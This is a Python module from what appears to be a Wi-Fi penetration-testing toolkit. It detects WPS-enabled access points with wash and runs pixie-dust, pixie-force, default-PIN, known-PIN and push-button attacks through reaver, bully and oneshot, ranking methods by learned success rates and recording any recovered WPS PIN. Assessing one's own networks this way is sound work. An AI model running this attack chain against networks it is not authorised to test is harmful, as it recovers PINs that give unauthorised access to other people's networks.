"""WPS vulnerability assessment — the complete WPS attack surface.

Determines, using the Kali WPS toolchain, whether an access point is
vulnerable to WPS attacks. Everything is measured; nothing is guessed.

Attack methods implemented (verified against upstream tool docs):

1. **Detection** — ``wash`` lists WPS-enabled APs (BSSID, channel, WPS version,
   locked state, vendor).
2. **Pixie dust** — ``reaver -K 1`` (or ``bully -d`` / ``oneshot -K``): the
   offline attack exploiting weak/non-existent entropy. Fast, safe (no lockout).
3. **Pixie force** — ``pixiewps --force`` (full-range offline brute, mode 3):
   a deeper offline brute for devices where the fast path fails.
4. **Pixie loop** — ``reaver -P``: collect PixieHashes without completing M4,
   which can avoid AP lockout while harvesting material for offline pixiewps.
5. **Default / vendor PIN** — ``reaver -W 1|2`` (Belkin/D-Link) or
   ``bully -g 1|2``: test vendor-computed default PINs derived from the MAC.
6. **Known PIN** — ``reaver -p <pin>``: test a specific known/candidate PIN.
7. **Push-button connect (PBC)** — ``oneshot --pbc``: requires pressing the
   router's WPS button; tests the physical-vector exposure.

Vulnerability verdicts (deterministic, from measured facts only):

* ``WPS_DISABLED``       — no WPS beacon (safe from WPS attacks).
* ``WPS_ENABLED``        — WPS present; not (yet) confirmed exploitable.
* ``VULNERABLE_PIXIE``   — pixie dust/force recovered a PIN offline.
* ``VULNERABLE_DEFAULT`` — a vendor default PIN was accepted.
* ``NOT_VULNERABLE``     — WPS present but none of the tested methods succeeded.

For authorized security testing only. The online PIN brute force is NOT run
automatically (hours + lockout risk); it is exposed via wrappers for manual use.
"""

from __future__ import annotations

import json
import logging
import random
import re
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path

from ..constants import (
    TOOL_BULLY,
    TOOL_ONESHOT,
    TOOL_REAVER,
    TOOL_WASH,
)
from ..exceptions import CaptureError, LearningStateError
from ..tools.registry import ToolRegistry
from ..utils.proc import ProcResult
from ..utils.validation import parse_channel, parse_mac, parse_signal_dbm

log = logging.getLogger("handshaker.wps")

_WASH_HEADER_RE = re.compile(r"BSSID", re.IGNORECASE)
_WPS_VERSION_RE = re.compile(r"^\d+\.\d+$")

# --------------------------------------------------------------------------- #
# Strategic knowledge (measured facts -> attack priority)
# --------------------------------------------------------------------------- #
# Chipsets documented as affected by the pixie-dust weakness (weak/non-existent
# RNG in E-S1/E-S2). Vendor strings are matched case-insensitively from wash.
VENDOR_PIXIE_DUST = {
    "broadcom", "ralink", "realtek", "mediatek", "atheros", "marvell",
    "qualcomm", "ralink technology", "intel",
}
# Vendors with documented MAC-derived default PINs (reaver -W / bully -g).
VENDOR_DEFAULT_PIN = {"belkin", "d-link", "dlink", "d link"}

# Canonical method order (used as the fallback and for enabled-method mapping).
DEFAULT_METHOD_ORDER = [
    "pixie_dust", "pixie_force", "default_pin", "pixie_loop", "push_button",
]
# Methods that never require an online PIN exchange (safe when WPS is locked).
OFFLINE_METHODS = {"pixie_dust", "pixie_force", "pixie_loop"}

# method name -> config flag that enables it
_METHOD_FLAGS = {
    "pixie_dust": "pixie_dust",
    "pixie_force": "pixie_force",
    "default_pin": "default_pin",
    "pixie_loop": "pixie_loop",
    "push_button": "push_button",
}

# reaver/bully/pixiewps success markers. Require a recovered/found/[+] context
# so "Suggested WPS PIN: 12345670" is not treated as a recovered PIN.
_PIN_RE = re.compile(
    r"\[\+\]\s*WPS\s*PIN\s*[:=]\s*'?(\d{4,8})'?",
    re.IGNORECASE,
)
_PIN_FOUND_RE = re.compile(
    r"WPS\s*PIN\s+(?:found|recovered|cracked)\s*[:=]?\s*'?(\d{4,8})'?",
    re.IGNORECASE,
)


@dataclass
class WpsAp:
    """A measured WPS-enabled access point (fields from wash output)."""

    bssid: str
    channel: int = 0
    signal: int = -100
    wps_version: str = ""
    locked: bool = False
    vendor: str = ""
    essid: str = ""

    @property
    def wps_enabled(self) -> bool:
        return bool(self.wps_version)

    @property
    def context_key(self) -> str:
        """A measured feature key for cross-AP transfer: ``vendor|wps_version``.

        Used by the learning engine so a new AP inherits a prior from
        structurally similar APs (same vendor and WPS version).
        """
        vendor = (self.vendor or "?").strip().lower()
        version = (self.wps_version or "?").strip()
        return f"{vendor}|{version}"

    def summary(self) -> str:
        lock = "LOCKED" if self.locked else "unlocked"
        return (
            f"{self.bssid} ch={self.channel} sig={self.signal}dBm "
            f"WPS={self.wps_version or '?'} [{lock}] '{self.essid}'"
        )


@dataclass
class WpsVerdict:
    """The final, honest vulnerability verdict for one AP."""

    bssid: str
    essid: str
    status: str                 # one of the *_ constants below
    wps_enabled: bool
    wps_version: str = ""
    locked: bool = False
    pin: str | None = None      # set only when a PIN was actually recovered
    reason: str = ""
    tools_used: list[str] = field(default_factory=list)
    attempts: list[str] = field(default_factory=list)

    @property
    def vulnerable(self) -> bool:
        return self.status in (VULNERABLE_PIXIE, VULNERABLE_DEFAULT)

    def to_dict(self) -> dict:
        return {
            "bssid": self.bssid,
            "essid": self.essid,
            "status": self.status,
            "vulnerable": self.vulnerable,
            "wps_enabled": self.wps_enabled,
            "wps_version": self.wps_version,
            "locked": self.locked,
            "pin": self.pin,
            "reason": self.reason,
            "tools_used": self.tools_used,
            "attempts": self.attempts,
        }


WPS_DISABLED = "WPS_DISABLED"
WPS_ENABLED = "WPS_ENABLED"
VULNERABLE_PIXIE = "VULNERABLE_PIXIE"
VULNERABLE_DEFAULT = "VULNERABLE_DEFAULT"
NOT_VULNERABLE = "NOT_VULNERABLE"


class WpsHistory:
    """Persistent record of measured WPS outcomes (per BSSID and per vendor).

    Mirrors the handshake ``LearningStore``: only *measured* success/failure is
    recorded, success rates are recomputed on demand with time decay, and a
    ``path=None`` store is in-memory only (no filesystem side effects) for tests.
    """

    def __init__(self, path: Path | str | None = None, decay: float = 0.95) -> None:
        self.path = Path(path) if path else None
        self.decay = decay
        self._data: dict = {"version": 1, "records": []}
        self._lock = threading.RLock()
        if self.path:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self._load()

    def _load(self) -> None:
        if not self.path or not self.path.exists():
            return
        try:
            d = json.loads(self.path.read_text())
            if isinstance(d, dict) and isinstance(d.get("records"), list):
                self._data = d
        except (json.JSONDecodeError, OSError) as exc:
            raise LearningStateError(f"Corrupt WPS history {self.path}: {exc}") from exc

    def save(self) -> None:
        if not self.path:
            return
        import os
        import shutil
        with self._lock:
            self._data.setdefault("schema_version", 2)
            tmp = self.path.with_name(f"{self.path.name}.{os.getpid()}.{time.time_ns()}.tmp")
            tmp.write_text(json.dumps(self._data, indent=2))
            if self.path.exists():
                shutil.copy2(self.path, self.path.with_suffix(self.path.suffix + ".bak"))
            tmp.replace(self.path)

    def record(self, key: str, method: str, success: bool) -> None:
        with self._lock:
            self._data["records"].append({
                "key": key, "method": method,
                "success": bool(success), "ts": time.time(),
            })

    def method_rates(self, key: str, now: float | None = None) -> dict[str, float]:
        """Recomputed, time-decayed success rate per method for ``key``.

        Only methods that have at least one recorded outcome appear; rates are
        derived fresh (never stored) so stale data decays away.
        """
        stats = self.method_stats(key, now=now)
        return {m: s["rate"] for m, s in stats.items()}

    def method_stats(self, key: str, now: float | None = None) -> dict[str, dict[str, float]]:
        """Recomputed, time-decayed ``{trials, wins, rate}`` per method for ``key``."""
        now = now if now is not None else time.time()
        with self._lock:
            records = list(self._data["records"])
        wins: dict[str, float] = {}
        trials: dict[str, float] = {}
        for r in records:
            if r.get("key") != key:
                continue
            method = r.get("method")
            if not method:
                continue
            age = max(0.0, now - float(r.get("ts", now)))
            weight = self.decay ** (age / 60.0)
            trials[method] = trials.get(method, 0.0) + weight
            if r.get("success"):
                wins[method] = wins.get(method, 0.0) + weight
        out: dict[str, dict[str, float]] = {}
        for m in trials:
            out[m] = {"trials": trials[m], "wins": wins[m],
                      "rate": wins[m] / trials[m] if trials[m] else 0.0}
        return out


class WpsStrategist:
    """Orders WPS attacks strategically from measured facts + learned outcomes.

    Advanced, principled ordering (mirrors the handshake bandit):

    1. **Vendor-driven** — a pixie-dust-vulnerable chipset tries pixie dust
       first; a Belkin/D-Link AP tries the default-PIN attack first.
    2. **Learning with transfer** — every remaining method gets a Beta posterior
       over its success probability, blended from the AP's own measured outcomes
       and the aggregated outcomes of *structurally similar* APs (same vendor ×
       WPS version) via hierarchical shrinkage (``transfer`` weight). Methods are
       ranked by posterior mean, so a new AP inherits a prior instead of starting
       cold, while its own evidence dominates as it accumulates.
    3. **Lock-aware** — a locked AP only runs *offline* methods (no online PIN
       exchange that would waste time / worsen lockout).
    4. **Fallback** — the canonical order fills in whatever remains.

    Deterministic by default (posterior-mean ranking); set ``exploration`` in
    config to enable epsilon-style shuffling of the learned order.
    """

    def __init__(self, history: WpsHistory, transfer: float = 0.5,
                 exploration: float = 0.0, seed: int | None = None) -> None:
        self.history = history
        self.transfer = max(0.0, transfer)
        self.exploration = max(0.0, min(1.0, exploration))
        self._rng = random.Random(seed)

    def _posterior(self, ap: WpsAp, method: str) -> tuple[float, float, float]:
        """Return ``(alpha, beta, mean)`` for a method, blending own + context."""
        own = self.history.method_stats(ap.bssid).get(method, {"trials": 0.0, "wins": 0.0})
        ctx = self.history.method_stats(ap.context_key).get(method, {"trials": 0.0, "wins": 0.0})
        eff_wins = own["wins"] + self.transfer * ctx["wins"]
        eff_trials = own["trials"] + self.transfer * ctx["trials"]
        alpha = 1.0 + eff_wins
        beta = 1.0 + (eff_trials - eff_wins)
        return alpha, beta, alpha / (alpha + beta)

    def plan(self, ap: WpsAp, config: dict) -> list[str]:
        enabled = [m for m in DEFAULT_METHOD_ORDER
                   if config.get(_METHOD_FLAGS[m], False)]
        vendor = (ap.vendor or "").strip().lower()

        ordered: list[str] = []

        # 1) vendor-driven first picks (deterministic, safe)
        if vendor in VENDOR_DEFAULT_PIN and "default_pin" in enabled:
            ordered.append("default_pin")
        if vendor in VENDOR_PIXIE_DUST and "pixie_dust" in enabled:
            ordered.append("pixie_dust")

        # 2) learning: rank remaining methods by posterior mean (desc).
        remaining = [m for m in enabled if m not in ordered]
        remaining.sort(key=lambda m: (-self._posterior(ap, m)[2],
                                      DEFAULT_METHOD_ORDER.index(m)))

        # Optional exploration: shuffle the learned order with probability
        # `exploration` (epsilon). Off by default -> deterministic.
        if remaining and self.exploration > 0 and self._rng.random() < self.exploration:
            self._rng.shuffle(remaining)

        ordered.extend(remaining)

        # 3) locked AP -> offline methods only
        if ap.locked:
            ordered = [m for m in ordered if m in OFFLINE_METHODS]

        return ordered


class WpsAssessor:
    def __init__(self, registry: ToolRegistry, config: dict | None = None,
                 history: WpsHistory | None = None) -> None:
        self.registry = registry
        self.config = (config or {}).get("wps", {}) or {}
        # In-memory history by default (tests); the engine wires persistence.
        self.history = history if history is not None else WpsHistory(path=None)
        self.strategist = WpsStrategist(
            self.history,
            transfer=float(self.config.get("transfer", 0.5)),
            exploration=float(self.config.get("exploration", 0.0)),
        )

    # ------------------------------------------------------------------ #
    # Detection (wash)
    # ------------------------------------------------------------------ #
    def detect(self, interface: str, channel: str | None = None) -> list[WpsAp]:
        """Scan for WPS-enabled APs; returns the measured list (possibly empty)."""
        if not self.registry.has(TOOL_WASH):
            raise CaptureError("wash is required for WPS detection but is not installed.")
        res = self.registry.wash().scan(
            interface, channel=channel,
            all_aps=bool(self.config.get("show_all", False)),
            ignore_fcs=bool(self.config.get("ignore_fcs", True)),
        )
        return parse_wash(res)

    # ------------------------------------------------------------------ #
    # Individual attack methods
    # ------------------------------------------------------------------ #
    def _ch(self, ap: WpsAp) -> str | None:
        return str(ap.channel) if ap.channel else None

    def pixie_dust(self, interface: str, ap: WpsAp) -> ProcResult | None:
        """Offline pixie-dust attack. Returns the result, or None if no engine."""
        timeout = int(self.config.get("timeout", 120))
        # Prefer reaver, then bully, then oneshot.
        if self.registry.has(TOOL_REAVER):
            return self.registry.reaver().pixie_dust(
                interface, ap.bssid, channel=self._ch(ap), timeout=timeout)
        if self.registry.has(TOOL_BULLY):
            return self.registry.bully().pixie_dust(
                interface, ap.bssid, channel=self._ch(ap), timeout=timeout)
        if self.registry.has(TOOL_ONESHOT):
            return self.registry.oneshot().pixie_dust(interface, ap.bssid, timeout=timeout)
        return None

    def pixie_force(self, interface: str, ap: WpsAp) -> ProcResult | None:
        """Pixie force (full-range offline brute)."""
        timeout = int(self.config.get("force_timeout", 180))
        if self.registry.has(TOOL_ONESHOT):
            return self.registry.oneshot().pixie_force(interface, ap.bssid, timeout=timeout)
        return None

    def pixie_loop(self, interface: str, ap: WpsAp) -> ProcResult | None:
        """PixieLoop (collect hashes without M4)."""
        if self.registry.has(TOOL_REAVER):
            return self.registry.reaver().pixie_loop(
                interface, ap.bssid, channel=self._ch(ap),
                timeout=int(self.config.get("timeout", 120)))
        return None

    def default_pin(self, interface: str, ap: WpsAp, vendor: int) -> ProcResult | None:
        """Vendor default-PIN attack (1=Belkin, 2=D-Link for reaver)."""
        timeout = int(self.config.get("timeout", 120))
        if self.registry.has(TOOL_REAVER):
            return self.registry.reaver().default_pin(
                interface, ap.bssid, vendor, channel=self._ch(ap), timeout=timeout)
        if self.registry.has(TOOL_BULLY):
            # bully ordering: 1=D-Link, 2=Belkin (opposite of reaver)
            bully_vendor = {1: 2, 2: 1}.get(vendor, 2)
            return self.registry.bully().default_pin(
                interface, ap.bssid, bully_vendor, channel=self._ch(ap), timeout=timeout)
        return None

    def known_pin(self, interface: str, ap: WpsAp, pin: str) -> ProcResult | None:
        """Test a specific known PIN."""
        if self.registry.has(TOOL_REAVER):
            return self.registry.reaver().known_pin(
                interface, ap.bssid, pin, channel=self._ch(ap),
                timeout=int(self.config.get("timeout", 120)))
        return None

    def push_button(self, interface: str, ap: WpsAp) -> ProcResult | None:
        """Push-button connect (PBC) — tests physical-vector exposure."""
        if self.registry.has(TOOL_ONESHOT):
            return self.registry.oneshot().push_button(
                interface, bssid=ap.bssid,
                timeout=int(self.config.get("timeout", 120)))
        return None

    # ------------------------------------------------------------------ #
    # Full assessment
    # ------------------------------------------------------------------ #
    def assess(self, interface: str, channel: str | None = None) -> list[WpsVerdict]:
        """Detect WPS APs and run the configured attack chain for each."""
        aps = self.detect(interface, channel=channel)
        return [self.assess_one(interface, ap) for ap in aps]

    def assess_one(self, interface: str, ap: WpsAp) -> WpsVerdict:
        """Run the strategic vulnerability chain against a single detected AP.

        The attack order is produced by :class:`WpsStrategist` from measured
        facts (vendor, lock state) and learned outcomes — not a hardcoded order.
        Execution stops on the first confirmed vulnerability.
        """
        verdict = WpsVerdict(
            bssid=ap.bssid, essid=ap.essid, status=WPS_ENABLED,
            wps_enabled=ap.wps_enabled, wps_version=ap.wps_version, locked=ap.locked,
        )
        plan = self.strategist.plan(ap, self.config)
        if not plan:
            verdict.status = NOT_VULNERABLE
            verdict.reason = "no WPS attack methods enabled in config"
            return verdict

        for method in plan:
            verdict.attempts.append(method)
            pin = self._dispatch(method, interface, ap, verdict)
            if pin:
                verdict.pin = pin
                if method in ("pixie_dust", "pixie_force"):
                    verdict.status = VULNERABLE_PIXIE
                    verdict.reason = f"{method} recovered WPS PIN offline"
                elif method == "default_pin":
                    verdict.status = VULNERABLE_DEFAULT
                    verdict.reason = "vendor default PIN accepted"
                else:
                    verdict.status = VULNERABLE_PIXIE
                    verdict.reason = f"{method} recovered WPS PIN"
                # NOTE: outcome recording happens once, inside _dispatch (which
                # also records *failures*), so the learning signal is not
                # double-counted on success.
                return verdict

        verdict.status = NOT_VULNERABLE
        verdict.reason = "WPS present but no tested method recovered a PIN"
        return verdict

    def _dispatch(self, method: str, interface: str, ap: WpsAp,
                  verdict: WpsVerdict) -> str | None:
        """Run one attack method; return a recovered PIN or None.

        Outcome recording (success/failure) happens here for PIN-recoverable
        methods, so the strategist can learn from both wins and losses.
        """
        if method == "pixie_dust":
            res = self._run(self.pixie_dust, interface, ap, "pixie_dust")
            if res is None:
                return None
            verdict.tools_used.append("pixie_dust")
            pin = parse_wps_pin(res)
            self._record_outcome(ap, "pixie_dust", bool(pin))
            return pin

        if method == "pixie_force":
            res = self._run(self.pixie_force, interface, ap, "pixie_force")
            if res is None:
                return None
            verdict.tools_used.append("pixie_force")
            pin = parse_wps_pin(res)
            self._record_outcome(ap, "pixie_force", bool(pin))
            return pin

        if method == "default_pin":
            ran = False
            vendor_name = (ap.vendor or "").strip().lower()
            if vendor_name in {"belkin"}:
                vendors = (1,)
            elif vendor_name in {"d-link", "dlink", "d link"}:
                vendors = (2,)
            else:
                vendors = (1, 2)
            for vendor in vendors:
                res = self._run(self.default_pin, interface, ap, "default_pin", vendor)
                if res is None:
                    continue
                ran = True
                verdict.tools_used.append("default_pin")
                pin = parse_wps_pin(res)
                if pin:
                    self._record_outcome(ap, "default_pin", True)
                    return pin
            if ran:
                self._record_outcome(ap, "default_pin", False)
            return None

        if method == "pixie_loop":
            res = self._run(self.pixie_loop, interface, ap, "pixie_loop")
            if res is None:
                return None
            verdict.tools_used.append("pixie_loop")
            pin = parse_wps_pin(res)
            self._record_outcome(ap, "pixie_loop", bool(pin))
            return pin

        if method == "push_button":
            res = self._run(self.push_button, interface, ap, "push_button")
            if res is None:
                return None
            verdict.tools_used.append("push_button")
            pin = parse_wps_pin(res)
            self._record_outcome(ap, "push_button", bool(pin))
            return pin

        return None

    def _record_outcome(self, ap: WpsAp, method: str, success: bool) -> None:
        # Record per-BSSID AND per-context (vendor × WPS version) so similar APs
        # share a prior (transfer learning).
        self.history.record(ap.bssid, method, success)
        self.history.record(ap.context_key, method, success)
        self.history.save()

    def _run(self, fn, interface, ap, label, *args) -> ProcResult | None:
        """Run an attack method; log failures truthfully, return result or None."""
        try:
            return fn(interface, ap, *args) if args else fn(interface, ap)
        except Exception as exc:  # noqa: BLE001
            log.info("%s for %s failed/skipped: %s", label, ap.bssid, exc)
            return None


# --------------------------------------------------------------------------- #
# Parsers (pure, unit-testable)
# --------------------------------------------------------------------------- #
def parse_wash(result: ProcResult) -> list[WpsAp]:
    """Parse ``wash`` tabular output into a list of :class:`WpsAp`.

    wash prints a header line then one row per WPS AP:
        BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
    Columns are whitespace-separated; the ESSID is the final, possibly
    space-containing, field. Returns [] on malformed/empty output.
    """
    aps: list[WpsAp] = []
    lines = (result.stdout + "\n" + result.stderr).splitlines()
    for line in lines:
        if _WASH_HEADER_RE.match(line.strip()):
            continue
        ap = _parse_wash_line(line)
        if ap:
            aps.append(ap)
    return aps


def _parse_wash_line(line: str) -> WpsAp | None:
    parts = line.split()
    if len(parts) < 6:
        return None
    bssid = parse_mac(parts[0])
    if not bssid:
        return None
    channel = parse_channel(parts[1]) or 0
    signal = parse_signal_dbm(parts[2]) or -100
    wps = parts[3]
    if not _WPS_VERSION_RE.match(wps):
        wps = wps if wps.replace(".", "", 1).isdigit() else ""
    locked = parts[4].strip().lower() in ("yes", "y", "lock", "locked")
    vendor = parts[5]
    essid = " ".join(parts[6:]) if len(parts) > 6 else ""
    return WpsAp(bssid=bssid, channel=channel, signal=signal,
                 wps_version=wps, locked=locked, vendor=vendor, essid=essid)


def parse_wps_pin(result: ProcResult) -> str | None:
    """Extract a *recovered* WPS PIN from reaver/bully/pixiewps output.

    Accepts ``[+] WPS PIN: '12345670'`` and ``WPS PIN found: 9178``.
    Candidate/suggested lines without a ``[+]`` success marker are ignored.
    """
    text = result.output
    m = _PIN_RE.search(text) or _PIN_FOUND_RE.search(text)
    return m.group(1) if m else None
